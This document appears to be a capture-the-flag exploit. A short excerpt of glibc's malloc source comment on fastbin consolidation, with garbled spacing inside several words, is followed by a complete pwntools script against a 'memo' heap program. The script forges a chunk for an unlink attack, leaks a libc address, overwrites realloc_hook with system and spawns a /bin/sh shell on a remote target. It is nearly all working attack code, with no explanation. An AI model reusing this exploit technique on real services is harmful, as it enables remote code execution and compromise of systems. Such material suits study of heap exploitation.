#3428/*
#3429     If this is a large request, consolida te fastbins before continuing.
#3430     While it might look excessive     to kill all fastbins before
#3431     even seeing if there is space ava ilable, this avoids
#3432     fragmentation problems normally associate d with fastbins.
#3433     Also, in practice, programs tend to have run  s of either small or
#3434     large requests, but less often mixtures,   so consolidation is not
#3435     invoked all that often in most progr  ams. And the programs that
#3436     it is called frequently in otherwi    se tend to fragment.
#3437   */
#3438
#3439  else
#3440    {
#3441                        idx = largebin_index (nb);
#3442      if (have_fastchunks (av))
#3443              malloc_consolidate (av);
#3444    }  
from pwn import *
name=0x602040
puts=0x601fb8
off_puts=0x6fe30
off_realloc_hook=0x3be730

def show():
    r.recvuntil('6.exit')
    r.sendline('1')
    r.recvuntil('On this page you write:\n')

def edit(content):
    r.recvuntil('6.exit')
    r.sendline('2')
    r.recvuntil('this page:')
    r.sendline(content)

def tear(content):
    r.recvuntil('6.exit')
    r.sendline('3')
    r.recvuntil('size (bytes):')
    r.sendline(str(len(content)))
    r.recvuntil('of this page:')
    r.sendline(content)

def ch_name(name,noline=False):
    r.recvuntil('6.exit')
    r.sendline('4')
    r.recvuntil('Input your new name:')
    if noline:
        r.send(name)
    else:
        r.sendline(name)

def ch_titile(title):
    r.recvuntil('6.exit')
    r.sendline('5')
    r.recvuntil('new title:')
    r.sendline(title)

#r=process('./memo')
r=remote('localhost',3389)
edit('A'*0x30+'A'*8+p64(0x41))#prev_inuse
tear('A'*180)#free this chunk
tear('A'*128)#split to avoid next==top_chunk
ch_name(p64(0)+p64(0x20)+p64(name-0x18)+p64(name-0x10)+p64(0x20)+'@')#next chunk size=0x40 prev_inuse=0
log.info('fake chunk for unlink prepared')
tear('A'*(0x400)) #trigger malloc_consolidate (fast_bin consolidate) unlink() triggered
#name=602028
ch_name(p64(0)+p64(0x602030)+p64(puts)+p64(0x602030))
#                   title    content     
show()
x=r.recvn(6)+'\x00\x00'
puts=u64(x)
libc=puts-off_puts#get libc_base
log.info('libc='+hex(libc))
reallochook=libc+off_realloc_hook
log.info('realloc_hook='+hex(reallochook))
log.info('system='+hex(libc+0x46640))
log.info('/bin/sh='+hex(libc+0x17ccdb))
ch_titile(p64(reallochook)+p64(libc+0x17ccdb)+p64(0)+p64(0)+p64(0))
#            titile             content              remenber overwrite the page accounts
ch_titile(p64(libc+0x46640))#overwrite titile
r.recvuntil('it')
r.sendline('3')
r.recvuntil('):')
r.sendline('130')
r.interactive()
